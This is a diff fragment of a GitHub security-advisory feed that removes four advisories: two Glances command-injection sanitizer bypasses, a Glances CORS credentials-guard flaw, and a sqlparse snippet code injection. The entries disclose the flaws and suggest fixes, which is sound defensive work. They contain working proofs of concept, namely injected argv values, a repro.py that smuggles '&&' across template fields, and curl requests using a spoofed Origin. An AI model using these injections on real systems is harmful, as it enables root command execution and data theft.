-        <link href="https://github.com/advisories/GHSA-73wf-9vmv-5pv9"/>
-        <updated>2026-08-17T17:20:25.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>CVE-2026-32608 ("Command Injection via Process Names in Action Command Templates") was fixed (commit <code>5680a5d</code>) by adding <code>_sanitize_mustache_dict</code>, which replaces the shell operators <code>&amp;&amp;</code>, <code>|</code>, <code>&gt;&gt;</code>, <code>&gt;</code> with spaces in the values rendered into action command templates.</p>
-<p>The sanitizer only processes <strong>top-level string</strong> values (<code>if isinstance(v, str)</code>). Attacker-controlled <strong>nested</strong> values — most notably a process's <strong><code>cmdline</code>, which Glances exposes as a <code>list</code></strong> and which is fully attacker-controlled via argv — are passed through <strong>unsanitized</strong>. Because the Mustache renderer (<code>chevron</code>) does <strong>not</strong> HTML-escape the pipe character <code>|</code>, a <code>|</code> embedded in such a nested value survives into the rendered command and is then interpreted by <code>secure_popen</code> (which still interprets <code>&amp;&amp;</code>/<code>|</code>/<code>&gt;</code> by default, <code>allow_operators=True</code>), re-introducing the exact command injection the CVE was meant to close.</p>
-<h2 id="details">Details</h2>
-<p>The fix (<code>glances/actions.py</code>):</p>
-<pre><code class="language-python">_SHELL_OPERATORS = ('&amp;&amp;', '|', '&gt;&gt;', '&gt;')                     # line 25
-
-def _sanitize_mustache_dict(mustache_dict):                   # line 28
-    ...
-    for k, v in mustache_dict.items():
-        if isinstance(v, str):                                # line 40  &lt;-- ONLY top-level strings
-            for op in _SHELL_OPERATORS:
-                v = v.replace(op, ' ')
-            safe[k] = v
-        else:
-            safe[k] = v                                       # nested list/dict passed VERBATIM
-    return safe
-</code></pre>
-<p>Render + sink (<code>glances/actions.py:104-111</code>):</p>
-<pre><code class="language-python">safe_dict = _sanitize_mustache_dict(mustache_dict)
-cmd_full  = chevron.render(cmd, safe_dict)                    # chevron does NOT escape '|'
-...
-ret = secure_popen(cmd_full)                                 # secure_popen(cmd, allow_operators=True)
-</code></pre>
-<p><code>secure_popen</code> (<code>glances/secure.py:17</code>, default <code>allow_operators=True</code>) splits the command by <code>&amp;&amp;</code>, then <code>__secure_popen</code> interprets <code>|</code> (pipe to a new process) and <code>&gt;</code> (write output to a file). A surviving <code>|</code> therefore launches an attacker-named second process.</p>
-<p><strong>The attacker-controlled nested value — <code>cmdline</code>.</strong> The action <code>mustache_dict</code> is the per-item plugin stat (<code>glances/plugins/plugin/model.py:931</code> <code>mustache_dict = item</code>, then <code>:943</code> <code>self.actions.run(..., mustache_dict=mustache_dict)</code>). For the processlist plugin, each <code>item</code> contains <code>cmdline</code>, a <strong>list</strong> of the process arguments, set by the attacker simply by launching a process with chosen argv. The sanitizer's <code>isinstance(v, str)</code> test skips the list, so its elements reach <code>chevron.render</code> unmodified.</p>
-<p><strong>Why the operator survives render.</strong> <code>chevron</code>/Mustache HTML-escapes <code>&amp; &lt; &gt; " '</code> for <code>{{var}}</code> (so <code>&gt;</code> and <code>&amp;&amp;</code> are neutralized) but <strong>does not escape <code>|</code></strong>. A pipe in the (unsanitized) nested value therefore reaches <code>secure_popen</code> intact and is interpreted.</p>
-<p><strong>Parent-fix attribution (verified against the real diff of commit <code>5680a5d</code> / CVE-2026-32608):</strong> that fix added exactly <code>_SHELL_OPERATORS</code>, <code>_sanitize_mustache_dict</code>, and the <code>_sanitize_mustache_dict(mustache_dict)</code> call — and the sanitizer's docstring explicitly claims to neutralize "user-controllable data (process names, container names, mount points, etc.)". It does so only for top-level strings; the list/dict case (<code>else: safe[k] = v</code>) was left unsanitized. This is therefore a genuine incomplete-fix gap, not a re-report of the patched (top-level string) vector.</p>
-<h2 id="proof-of-concept">Proof of Concept</h2>
-<p>Lab-only, harmless (touches a marker file; non-destructive). Runs the real <code>glances</code> chain (<code>_sanitize_mustache_dict</code> → <code>chevron.render</code> → <code>secure_popen</code>) — see <code>poc/glances_nested_mustache_poc.py</code>.</p>
-<p>Attacker process argv (the only attacker input): <code>cmdline = ['x', '|touch /tmp/glances_poc_marker', '#']</code>.
-Admin action template (renders the offending process's cmdline): <code>echo ALERT {{#cmdline}}{{.}} {{/cmdline}}</code>.</p>
-<p>Observed (confirmed on develop HEAD <code>92156d0</code>/4.5.6 and verified code-identical on v4.5.5):</p>
-<pre><code>cmdline after sanitizer : ['x', '|touch /tmp/glances_poc_marker', '#']   &lt;- pipe survives
-cmd_full -&gt; secure_popen : 'echo ALERT x |touch /tmp/glances_poc_marker # '
-[VULNERABLE] marker created -&gt; /tmp/glances_poc_marker  (command injection executed)
-</code></pre>
-<p>Replacing <code>touch /tmp/...</code> with any command yields arbitrary execution in the Glances process context.</p>
-<h2 id="preconditions-stated-honestly">Preconditions (stated honestly)</h2>
-<ul>
-<li>A configured alert <strong>action</strong> whose command template <strong>renders a nested stat field</strong> (e.g. the process <code>cmdline</code> via a <code>{{#cmdline}}…{{/cmdline}}</code> section). Templates that render only <strong>flat string</strong> fields (<code>{{name}}</code>, <code>{{value}}</code>, <code>{{username}}</code>, <code>{{mnt_point}}</code>) are <strong>not</strong> affected — those values <em>are</em> sanitized.</li>
-<li>Glances running with privilege to enumerate the attacker's process (typically <strong>root</strong> in server/agent monitoring deployments) → privilege boundary crossed (<code>S:C</code>).</li>
-</ul>
-<h2 id="impact">Impact</h2>
-<p>A local unprivileged user gains OS command execution in the Glances security context (commonly root) — the same impact and threat model as the parent CVE-2026-32608, re-enabled for any action template that renders a nested stat field. The injection is reliable once the (admin-set) template references such a field.</p>
-<h2 id="suggested-fix">Suggested fix</h2>
-<ul>
-<li>Sanitize <strong>recursively</strong> — apply the operator stripping to strings inside lists and dicts, not only top-level <code>str</code> values.</li>
-<li>And/or build the templated action as an argument list and run it via <code>secure_popen(..., allow_operators=False)</code> / <code>shell=False</code> without operator interpretation.</li>
-<li>And/or also strip the pipe <code>|</code> (and treat all <code>_SHELL_OPERATORS</code>) on every rendered string regardless of nesting; do not rely on Mustache HTML-escaping (it does not escape <code>|</code>).</li>
-</ul>
-<h2 id="credit">Credit</h2>
-<p>Ta Duc Thien</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/nicolargo/glances/security/advisories/GHSA-73wf-9vmv-5pv9">https://github.com/nicolargo/glances/security/advisories/GHSA-73wf-9vmv-5pv9</a></li>
-<li><a href="https://github.com/nicolargo/glances/commit/ea4cf2f54f0d961e24aa0b24fff9584bab39db93">https://github.com/nicolargo/glances/commit/ea4cf2f54f0d961e24aa0b24fff9584bab39db93</a></li>
-<li><a href="https://github.com/nicolargo/glances/releases/tag/v4.5.6">https://github.com/nicolargo/glances/releases/tag/v4.5.6</a></li>
-<li><a href="https://github.com/advisories/GHSA-73wf-9vmv-5pv9">https://github.com/advisories/GHSA-73wf-9vmv-5pv9</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-73wf-9vmv-5pv9</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-08-17T17:20:24.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[sqlparse] sqlparse: Generated Python and PHP snippets allow SQL string breakout through unescaped backslashes]]></title>
-        <id>https://github.com/advisories/GHSA-3496-9g83-7v6x</id>
-        <link href="https://github.com/advisories/GHSA-3496-9g83-7v6x"/>
-        <updated>2026-08-17T17:20:12.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>The documented Python and PHP output modes generate source-code snippets from caller-supplied SQL. Their output filters escape quote characters without first escaping existing backslashes. Crafted SQL can therefore neutralize the generated quote escape, terminate the intended language string, and place attacker-controlled code into the generated snippet. If a downstream consumer executes or imports that generated source, the injected code runs in the consumer's environment.</p>
-<h3 id="details">Details</h3>
-<p>The Python output filter places SQL in a single-quoted string and replaces each single quote with an escaped quote. The PHP output filter performs the equivalent operation for a double-quoted string. Neither transformation escapes pre-existing backslashes before escaping quotes. A backslash supplied immediately before a quote causes the generated backslash to be escaped instead of the quote, allowing the quote to close the string.</p>
-<p>The affected modes are exposed through <code>sqlparse.format(..., output_format='python')</code>, <code>sqlparse.format(..., output_format='php')</code>, and the corresponding <code>sqlformat -l</code> options. Formatting produces the injected source but does not itself execute it; code execution occurs when a downstream workflow treats the generated snippet as Python or PHP code.</p>
-<p>Relevant code locations:</p>
-<ul>
-<li><code>sqlparse/formatter.py:193</code> — selection of the output-language filters</li>
-<li><code>sqlparse/filters/output.py:45</code> — opening of the generated Python string</li>
-<li><code>sqlparse/filters/output.py:65</code> — incomplete Python quote escaping</li>
-<li><code>sqlparse/filters/output.py:91</code> — opening of the generated PHP string</li>
-<li><code>sqlparse/filters/output.py:114</code> — incomplete PHP quote escaping</li>
-</ul>
-<h3 id="poc">PoC</h3>
-<p>A complete validated reproduction is attached as <a href="https://github.com/user-attachments/files/29410134/output_format_snippet_injection-poc.zip">output_format_snippet_injection-poc.zip</a>. The archive contains <code>reproduction/</code> at its root, uses Git and Docker, and validates the Python output path by generating and executing a snippet containing a controlled marker-file write.</p>
-<p>Extract the archive beside this report, then run:</p>
-<pre><code class="language-console">./reproduction/run.sh
-</code></pre>
-<p>Observed result:</p>
-<p>The generated Python snippet placed the attacker-controlled <code>pathlib.Path(...).write_text(...)</code> expression outside the intended SQL string. Executing the snippet wrote the expected proof marker, emitted <code>EVOHUNT_OUTPUT_FORMAT_INJECTION_VERIFIED</code>, and completed successfully.</p>
-<p>Verification method:</p>
-<p>The verification helper calls <code>sqlparse.format(..., output_format='python')</code>, executes the generated snippet, and fails unless the injected Python expression writes the exact proof marker file.</p>
-<p>Limitations:</p>
-<p>No reproduction blocker was recorded. The attached harness directly verifies the Python output path; exploitation also requires a downstream consumer to execute or import the generated source.</p>
-<h3 id="impact">Impact</h3>
-<p>This is source-code injection in the opt-in Python and PHP snippet-generation modes. An attacker who controls SQL converted by one of these modes can inject language code into the generated artifact. If that artifact is subsequently executed, the attacker can run code with the permissions and access of the downstream Python or PHP process.</p>
-<p>The demonstrated end-to-end result is code execution through a generated Python snippet. Formatting the SQL alone does not execute the payload, and ordinary parsing, splitting, or formatting without these output modes is not shown to be affected.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/andialbrecht/sqlparse/security/advisories/GHSA-3496-9g83-7v6x">https://github.com/andialbrecht/sqlparse/security/advisories/GHSA-3496-9g83-7v6x</a></li>
-<li><a href="https://github.com/andialbrecht/sqlparse/commit/53ff44b53e27cff78259acc1af015506fea60f63">https://github.com/andialbrecht/sqlparse/commit/53ff44b53e27cff78259acc1af015506fea60f63</a></li>
-<li><a href="https://github.com/advisories/GHSA-3496-9g83-7v6x">https://github.com/advisories/GHSA-3496-9g83-7v6x</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-3496-9g83-7v6x</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-08-17T17:20:11.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[glances] Glances: REST API CORS Credentials Guard Uses Exact-Match Instead of Membership Test — Bypassed by Any Multi-Origin Allowlist Containing the Wildcard]]></title>
-        <id>https://github.com/advisories/GHSA-fp27-88fp-2phg</id>
-        <link href="https://github.com/advisories/GHSA-fp27-88fp-2phg"/>
-        <updated>2026-08-17T17:04:52.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>Glances's REST API server includes a documented safety check intended to guarantee that <code>cors_credentials=True</code> can never be combined with an unrestricted CORS origin allowlist. The check compares the configured origin list to the wildcard using exact list equality (<code>cors_origins == ["*"]</code>) instead of a membership test. Any multi-entry origin configuration that merely includes <code>"*"</code> alongside other origins (e.g. <code>cors_origins=*,https://trusted.example.com</code>) bypasses the check entirely, while Starlette's underlying <code>CORSMiddleware</code> still treats the presence of <code>"*"</code> anywhere in the list as "allow all origins" and reflects the request's actual <code>Origin</code> header together with <code>Access-Control-Allow-Credentials: true</code>. This allows any website to read a victim's authenticated Glances monitoring data — including full process lists with command-line arguments — by exploiting the browser's automatic replay of cached HTTP Basic Auth credentials in a cross-origin request.</p>
-<h3 id="details">Details</h3>
-<p><code>glances/outputs/glances_restful_api.py:298</code>:</p>
-<pre><code class="language-python">if cors_origins == ["*"] and cors_credentials:
-    logger.warning(...)
-    cors_credentials = False
-</code></pre>
-<p>The intended guarantee is documented in <code>glances/outputs/glances_stdout_api_restful_doc.py:247-260</code>: <em>"Setting cors_credentials=True with cors_origins=</em> is not allowed. Glances will automatically disable credentials and log a warning if this combination is detected."* The exact-equality comparison only matches when <code>cors_origins</code> is precisely the single-element list <code>["*"]</code>. Starlette's <code>CORSMiddleware</code>, by contrast, determines wildcard behavior via <code>"*" in allow_origins</code> — a membership test — so any multi-entry list containing <code>"*"</code> is still treated by Starlette as "allow all origins," while Glances's own guard silently fails to disable credentials for that case, breaking the documented guarantee with no warning logged.</p>
-<p>This is the same exact-match-versus-membership-test bug shape that CVE-2026-46608 fixed in the sibling XML-RPC server (<code>glances/server.py</code>, which correctly performs <code>if '*' in cors_origins:</code>). The REST API's analogous check was never updated to the corrected pattern.</p>
-<h3 id="poc">PoC</h3>
-<p>Configuration:</p>
-<pre><code class="language-ini">[outputs]
-cors_origins=*,https://trusted.example.com
-cors_credentials=true
-</code></pre>
-<pre><code># Confirm auth is required
-curl -s -i http://127.0.0.1:36212/api/4/cpu
--&gt; 401 Unauthorized, www-authenticate: Basic
-
-# Authenticated request, Origin header set to an arbitrary domain never configured
-curl -s -i -u glances:&lt;password&gt; -H "Origin: https://totally-evil-attacker.com" \
-  http://127.0.0.1:36212/api/4/cpu
--&gt; 200 OK
-   access-control-allow-origin: https://totally-evil-attacker.com
-   access-control-allow-credentials: true
-   {"total": 0.0, "user": 0.0, ...}
-
-# Same against the process list, exposing command lines/usernames/PIDs
-curl -s -u glances:&lt;password&gt; -H "Origin: https://totally-evil-attacker.com" \
-  http://127.0.0.1:36212/api/4/processlist
--&gt; [{"cmdline": [...], "username": "...", "pid": ..., ...}, ...]
-   (same access-control-allow-origin / access-control-allow-credentials headers)
-</code></pre>
-<h3 id="impact">Impact</h3>
-<p>Any operator who configures <code>cors_origins</code> as a multi-entry list that includes the wildcard alongside one or more specific trusted origins — a plausible configuration mistake given the documented default is the bare wildcard, and an operator attempting to additionally permit a second legitimate dashboard origin may not realize the wildcard must first be removed — silently loses the documented credentials-disable protection. Any third-party website can then read the full authenticated monitoring dataset of any visitor who has previously logged into that Glances instance via their browser, including process command-line arguments (which frequently contain secrets passed as CLI flags), usernames, and PIDs.</p>
-<h3 id="remediation-suggestion">Remediation suggestion</h3>
-<p>Change the check at <code>glances_restful_api.py:298</code> from <code>cors_origins == ["*"]</code> to <code>"*" in cors_origins</code>, matching the corrected pattern already used in <code>glances/server.py</code> for the XML-RPC server.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/nicolargo/glances/security/advisories/GHSA-fp27-88fp-2phg">https://github.com/nicolargo/glances/security/advisories/GHSA-fp27-88fp-2phg</a></li>
-<li><a href="https://github.com/nicolargo/glances/commit/890858944ab9d03730ec6b1ba42d4015e6d85db5">https://github.com/nicolargo/glances/commit/890858944ab9d03730ec6b1ba42d4015e6d85db5</a></li>
-<li><a href="https://github.com/nicolargo/glances/releases/tag/v4.5.6">https://github.com/nicolargo/glances/releases/tag/v4.5.6</a></li>
-<li><a href="https://github.com/advisories/GHSA-fp27-88fp-2phg">https://github.com/advisories/GHSA-fp27-88fp-2phg</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-fp27-88fp-2phg</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-08-17T17:04:51.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[glances] Glances has a command injection bypass of action-template sanitizer via cross-field shell-operator reconstruction]]></title>
-        <id>https://github.com/advisories/GHSA-qcpp-8x79-hhp3</id>
-        <link href="https://github.com/advisories/GHSA-qcpp-8x79-hhp3"/>
-        <updated>2026-08-17T16:36:37.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>The Glances action system lets an administrator configure shell commands that run
-when a monitoring threshold is crossed. The command is a Mustache template whose
-variables are filled with runtime stat fields such as a process name, a container
-name or a filesystem mount point. Those fields are attacker-influenceable: a
-local, unprivileged user who starts a process (or a container) controls its name
-and command line. The rendered command is executed by <code>secure_popen()</code>, which
-interprets <code>&amp;&amp;</code>, <code>|</code> and <code>&gt;</code> as chaining / pipe / redirection operators.</p>
-<p><code>glances/actions.py</code> defends against this with <code>_sanitize_mustache_dict()</code>, which
-strips those operators from <strong>each individual</strong> template value before rendering.
-The sanitization is applied per field, but the operators are reconstructed
-<strong>across the boundary of two adjacent template variables</strong> after Mustache
-rendering. When an action template concatenates two unescaped variables
-(<code>{{{a}}}{{{b}}}</code> or <code>{{&amp;a}}{{&amp;b}}</code>) and the attacker makes the first value end
-with <code>&amp;</code> and the second begin with <code>&amp;</code>, the rendered command contains a real
-<code>&amp;&amp;</code>, and <code>secure_popen()</code> executes the injected command. The single-<code>&amp;</code> in each
-value passes the per-field filter untouched.</p>
-<h3 id="affected-versions">Affected versions</h3>
-<p><code>glances</code> <code>&lt;= 4.5.5</code> (verified against the published PyPI release <code>4.5.5</code>, the
-latest at the time of writing; <code>glances.__version__ == "4.5.5"</code>). The
-per-field sanitizer <code>_sanitize_mustache_dict()</code> is present and active in this
-release. Not patched in any released version.</p>
-<h3 id="privilege-required">Privilege required</h3>
-<p>Two roles are involved:</p>
-<ul>
-<li>A local, unprivileged user (or a container the attacker can name) supplies the
-attacker-controlled stat values (process/container name, mount point, etc.).
-This is the same trust boundary the action-template command-injection class
-already recognises: the attacker controls the process name, not the
-configuration.</li>
-<li>An administrator has configured an action whose command template concatenates
-two <strong>unescaped</strong> Mustache variables with no separating character
-(<code>{{{name}}}{{{cmdline}}}</code>). Unescaped Mustache (<code>{{{ }}}</code> / <code>{{&amp; }}</code>) is a
-documented Chevron feature and is the natural choice when the operator wants a
-value that contains shell-significant characters to reach the command verbatim.</li>
-</ul>
-<p>No network access to the target host is required beyond the ability to run a
-process (or start a named container) on it.</p>
-<h3 id="vulnerable-code-fileline">Vulnerable code (file:line)</h3>
-<p><code>glances/actions.py:25-46</code> — the per-field sanitizer:</p>
-<pre><code class="language-python"># glances/actions.py:25
-_SHELL_OPERATORS = ('&amp;&amp;', '|', '&gt;&gt;', '&gt;')
-
-def _sanitize_mustache_dict(mustache_dict):
-    """Return a copy of mustache_dict with shell operators replaced by spaces."""
-    if not mustache_dict:
-        return mustache_dict
-    safe = {}
-    for k, v in mustache_dict.items():
-        if isinstance(v, str):
-            for op in _SHELL_OPERATORS:
-                v = v.replace(op, ' ')          # per-field only
-            safe[k] = v
-        else:
-            safe[k] = v
-    return safe
-</code></pre>
-<p><code>glances/actions.py:100-111</code> — sanitize-then-render-then-execute:</p>
-<pre><code class="language-python"># glances/actions.py:100
-for cmd in commands:
-    if chevron_tag:
-        safe_dict = _sanitize_mustache_dict(mustache_dict)
-        cmd_full = chevron.render(cmd, safe_dict)   # concatenation happens here
-    else:
-        cmd_full = cmd
-    ret = secure_popen(cmd_full)                    # operators interpreted
-</code></pre>
-<h3 id="root-cause">Root cause</h3>
-<p><code>_sanitize_mustache_dict()</code> removes <code>&amp;&amp;</code>, <code>|</code>, <code>&gt;&gt;</code>, <code>&gt;</code> from each value in
-isolation. It does not remove a lone <code>&amp;</code>, because a single <code>&amp;</code> is not one of the
-listed operators. When two values are rendered next to each other by
-<code>chevron.render()</code>, a trailing <code>&amp;</code> from the first value and a leading <code>&amp;</code> from the
-second value join into a literal <code>&amp;&amp;</code> in <code>cmd_full</code>. <code>secure_popen()</code> then
-<code>cmd.split('&amp;&amp;')</code> and runs the second half as a separate <code>subprocess.Popen</code>
-(<code>shell=False</code>) process. The same reconstruction works for <code>&gt;</code> written as two
-adjacent <code>&gt;</code> characters split across the boundary (<code>...&gt;</code> + <code>&gt;...</code> and the
-<code>&gt;&gt;</code>/<code>&gt;</code> stripping is per field), and the sanitizer's own choice to sanitize
-before, rather than after, rendering is the defect.</p>
-<p>This is an incomplete fix of the action-template command-injection issue
-(CVE-2026-32608 / GHSA-vcv2-q258-wrg7): <code>_sanitize_mustache_dict()</code> closes the
-single-field case but not the cross-field-reconstruction case. The correct place
-to enforce the operator ban is on the fully rendered command string (or by never
-letting template-variable data introduce operators), not on the pre-render values
-one at a time.</p>
-<p>Chevron HTML-escapes <code>&amp;</code>, <code>&lt;</code>, <code>&gt;</code>, <code>"</code> inside standard double-brace <code>{{ }}</code>
-sections, so double-brace templates neutralise the <code>&amp;&amp;</code> reconstruction. The
-reconstruction is reachable specifically through <strong>unescaped</strong> variables
-(<code>{{{ }}}</code> / <code>{{&amp; }}</code>), which is why the per-field sanitizer is the sole
-remaining control on that path.</p>
-<h3 id="reachability--how-input-reaches-sink">Reachability / How input reaches sink</h3>
-<ol>
-<li>A local unprivileged user starts a process (or a container) whose <code>name</code>
-ends with <code>&amp;</code> and whose <code>cmdline</code> begins with <code>&amp; &lt;command&gt;</code> (both are stored
-verbatim in the plugin stat item).</li>
-<li>When the plugin crosses a <code>warning</code> / <code>critical</code> threshold,
-<code>glances/plugins/plugin/model.py</code> calls <code>self.actions.run</code> with the full stat
-item passed as the <code>mustache_dict</code> argument.</li>
-<li><code>GlancesActions.run</code> sanitizes each value with <code>_sanitize_mustache_dict()</code>
-(each keeps its single <code>&amp;</code>), then <code>chevron.render()</code> concatenates the two
-adjacent unescaped variables, producing a literal <code>&amp;&amp;</code> in the command string.</li>
-<li><code>secure_popen(cmd_full)</code> splits on <code>&amp;&amp;</code> and runs the attacker's segment as a
-separate <code>subprocess.Popen(shell=False)</code> process.</li>
-</ol>
-<p>The trust boundary crossed is process-name / container-name → shell operator,
-exactly the boundary the sanitizer was introduced to close.</p>
-<h3 id="reproduction-end-to-end-against-pinned-version-glances455">Reproduction (end-to-end, against pinned version <code>glances==4.5.5</code>)</h3>
-<pre><code class="language-bash"># 1. Install the latest published release into a clean venv
-python3.13 -m venv gv
-./gv/bin/pip install "glances==4.5.5"
-
-# 2. Run the reproducer, which drives the real
-#    glances.actions.GlancesActions.run() pipeline exactly as
-#    glances/plugins/plugin/model.py invokes it on an alert.
-./gv/bin/python repro.py
-</code></pre>
-<p><code>repro.py</code>:</p>
-<pre><code class="language-python">import os, sys, time
-sys.argv = ['glances']
-from glances.actions import GlancesActions
-
-MARK = "/tmp/glances_crossfield_pwned"
-NEG  = MARK + "_neg"
-for f in (MARK, NEG):
-    try: os.remove(f)
-    except FileNotFoundError: pass
-
-class Args:
-    time = 0
-ga = GlancesActions(args=Args())
-
-# A processlist stat item; a local low-privilege user controls both 'name' and
-# 'cmdline' by spawning a process (the established GHSA-vcv2 threat model).
-# 'name' ends with '&amp;', 'cmdline' begins with '&amp;'  -&gt;  '&amp;&amp;' forms across the boundary.
-item = {'name': 'evilproc&amp;', 'cmdline': '&amp; touch %s' % MARK,
-        'pid': 1337, 'cpu_percent': 99.0, 'key': 'pid'}
-
-# NEGATIVE CONTROL: the same values under an ESCAPED double-brace template are
-# neutralised by chevron HTML-escaping '&amp;' -&gt; '&amp;amp;'.
-neg_item = dict(item); neg_item['cmdline'] = '&amp; touch %s' % NEG
-ga.status.clear(); ga.start_timer._start = time.time() - 999
-ga.run("pl", "CRITICAL", ["logger p={{name}}{{cmdline}}"], repeat=True, mustache_dict=neg_item)
-time.sleep(0.3)
-print("NEGATIVE CONTROL (escaped {{name}}{{cmdline}}):",
-      "INJECTED" if os.path.exists(NEG) else "blocked (expected)")
-
-# POSITIVE: an UNESCAPED template with two adjacent variables. Per-field
-# _sanitize_mustache_dict leaves each single '&amp;'; the '&amp;&amp;' operator is
-# reconstructed after chevron.render, then split by secure_popen.
-ga.status.clear(); ga.start_timer._start = time.time() - 999
-ga.run("pl2", "CRITICAL", ["logger p={{{name}}}{{{cmdline}}}"], repeat=True, mustache_dict=item)
-time.sleep(0.5)
-print("POSITIVE (unescaped {{{name}}}{{{cmdline}}}):",
-      "INJECTED - 'touch' executed" if os.path.exists(MARK) else "blocked")
-</code></pre>
-<p>Captured output (<code>glances</code> 4.5.5, Python 3.13, x86_64 Linux):</p>
-<pre><code>NEGATIVE CONTROL (escaped {{name}}{{cmdline}}): blocked (expected)
-POSITIVE (unescaped {{{name}}}{{{cmdline}}}): INJECTED - 'touch' executed
-</code></pre>
-<p>The negative control confirms that the same attacker values under a standard
-double-brace template are blocked (chevron escapes <code>&amp;</code>). The positive case shows
-the injected <code>touch</code> executing when the template uses two adjacent unescaped
-variables: the file <code>/tmp/glances_crossfield_pwned</code> is created by the injected
-command, not by the intended <code>logger</code> action.</p>
-<h3 id="impact">Impact</h3>
-<ul>
-<li>Arbitrary command execution as the OS user running Glances (frequently root on
-monitored hosts) whenever an operator uses an unescaped, adjacent-variable
-action template and an attacker controls two neighbouring stat fields.</li>
-<li>The same reconstruction reaches <code>secure_popen()</code>'s file-redirection (<code>&gt;</code>) and
-pipe (<code>|</code>) handling, allowing arbitrary file write and output piping in
-addition to command chaining.</li>
-<li>The bypass defeats the dedicated <code>_sanitize_mustache_dict()</code> control that was
-added specifically to stop attacker-controlled stat values from injecting shell
-operators.</li>
-</ul>
-<h3 id="suggested-fix">Suggested fix</h3>
-<p>Enforce the operator ban on the <strong>rendered</strong> command string that comes from
-template-variable expansion, rather than on the pre-render values in isolation.
-One approach that mirrors the existing helper: render each variable, then reject /
-neutralise operators in the concatenated result, or strip lone <code>&amp;</code>/redirection
-characters that originate from variable data.</p>
-<pre><code class="language-python">def _sanitize_mustache_dict(mustache_dict):
-    if not mustache_dict:
-        return mustache_dict
-    safe = {}
-    for k, v in mustache_dict.items():
-        if isinstance(v, str):
-            # Neutralise every shell-significant character that secure_popen
-            # can interpret, including a lone '&amp;' that could pair with an
-            # adjacent variable to reconstruct '&amp;&amp;'.
-            for ch in ('&amp;', '|', '&gt;', '&lt;'):
-                v = v.replace(ch, ' ')
-            safe[k] = v
-        else:
-            safe[k] = v
-    return safe
-</code></pre>
-<p>Neutralising the single <code>&amp;</code> (and the single <code>&gt;</code> / <code>|</code>) in each value removes the
-cross-field reconstruction because no operator character survives on either side
-of a variable boundary. Alternatively, sanitize <code>cmd_full</code> after
-<code>chevron.render()</code>, or pass the template-derived data as <code>secure_popen(..., allow_operators=False)</code> when the command originates from stat-field substitution.</p>
-<h3 id="credit">Credit</h3>
-<p>Reported by tonghuaroot.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/nicolargo/glances/security/advisories/GHSA-qcpp-8x79-hhp3">https://github.com/nicolargo/glances/security/advisories/GHSA-qcpp-8x79-hhp3</a></li>
-<li><a href="https://github.com/nicolargo/glances/commit/9c280eae5419da680827024b60f6265956e31994">https://github.com/nicolargo/glances/commit/9c280eae5419da680827024b60f6265956e31994</a></li>
-<li><a href="https://github.com/nicolargo/glances/releases/tag/v4.5.6">https://github.com/nicolargo/glances/releases/tag/v4.5.6</a></li>
-<li><a href="https://github.com/advisories/GHSA-qcpp-8x79-hhp3">https://github.com/advisories/GHSA-qcpp-8x79-hhp3</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-qcpp-8x79-hhp3</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-08-17T16:36:37.000Z</published>
     </entry>
 </feed>
